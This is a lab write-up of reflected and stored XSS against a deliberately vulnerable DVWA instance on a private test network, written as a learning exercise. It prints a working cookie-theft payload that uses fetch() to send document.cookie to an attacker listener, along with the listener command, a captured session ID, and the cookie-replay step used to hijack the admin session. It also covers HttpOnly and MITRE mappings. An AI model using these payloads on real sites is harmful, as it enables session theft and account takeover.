# Lab Writeup #08 — XSS & Cookie Theft on DVWA

**Date:** 01/04/2026  
**Target:** 192.168.56.102 (DVWA — Security: Low)  
**Attacker:** 192.168.56.101 (Kali Linux)  

## TL;DR
Exploited reflected and stored XSS vulnerabilities in DVWA to inject JavaScript that stole the victim's session cookie and sent it to a listener on Kali. Used the captured PHPSESSID to hijack the session without knowing the password.

## What is XSS?
Cross-Site Scripting occurs when a web application displays user input without sanitising it first. Instead of treating the input as plain text, the browser interprets it as code and executes it. The attacker's script runs in the victim's browser with full access to their session.

There are two types:
- **Reflected XSS** — malicious script is in the URL, fires once when the victim clicks a crafted link
- **Stored XSS** — script is saved in the database, fires for every user who visits the page

Stored XSS is far more dangerous — one injection affects every visitor automatically.

## Attack Steps

### Step 1 — Confirm the Vulnerability (Reflected XSS)
Entered a basic script tag into the Name field:
```
Input: <script>alert('XSS')</script>
```
Result: Browser executed the JavaScript and displayed an alert popup.  
Conclusion: Input is rendered directly as HTML — no sanitisation in place.

### Step 2 — Start a Cookie Listener on Kali
Started a Python HTTP server to receive stolen cookie data:
```bash
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Step 3 — Inject Cookie Theft Payload
Injected JavaScript that reads the victim's cookies and sends them to Kali:
```
Input: <script>fetch('http://192.168.56.101:8000/?cookie='+document.cookie)</script>
```
The `document.cookie` property returns all cookies attached to the current session. The `fetch()` call sends them as a GET request to the attacker's server.

### Step 4 — Capture the Session Cookie
Kali's listener received the stolen cookie immediately:
```bash
192.168.56.101 - - [01/Apr/2026 06:53:29] "GET /?cookie=security=low;%20PHPSESSID=o3hmh337g2694s3chvkb429l6t;%20theme=light HTTP/1.1" 200 -
```
Cookie captured: `PHPSESSID=o3hmh337g2694s3chvkb429l6t`

### Step 5 — Session Hijack (No Password Required)
Used the stolen PHPSESSID to authenticate as the victim:
```
Firefox DevTools → Console:
document.cookie = "PHPSESSID=o3hmh337g2694s3chvkb429l6t; security=low"
```
Refreshed the page — logged in as admin without entering any credentials.

### Step 6 — Stored XSS
Injected the same payload into the Stored XSS message field:
```
Input: <script>fetch('http://192.168.56.101:8000/?cookie='+document.cookie)</script>
```
Result: Every user who visits the guestbook page automatically sends their cookie to Kali. The attack persists until the entry is deleted from the database.

## Key Findings
- XSS confirmed on both reflected and stored input fields
- Full session hijack achieved using a single stolen cookie
- Stored payload persists — affects every future visitor automatically
- No authentication required once PHPSESSID is captured
- `document.cookie` is accessible because the session cookie has no `HttpOnly` flag set

## Why HttpOnly Matters
If the `HttpOnly` flag is set on a cookie, JavaScript cannot read it — `document.cookie` returns nothing. This single header would have prevented this entire attack.

```
Set-Cookie: PHPSESSID=xxx; HttpOnly; Secure
```

## MITRE ATT&CK
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1185 — Browser Session Hijacking
- T1539 — Steal Web Session Cookie

## Next Steps
- Try XSS with DVWA security set to Medium — observe how filtering attempts can be bypassed
- Test stored XSS with a BeEF hook to demonstrate full browser control
- Add Apache log detection to log_parser.py to flag `<script>` patterns in web requests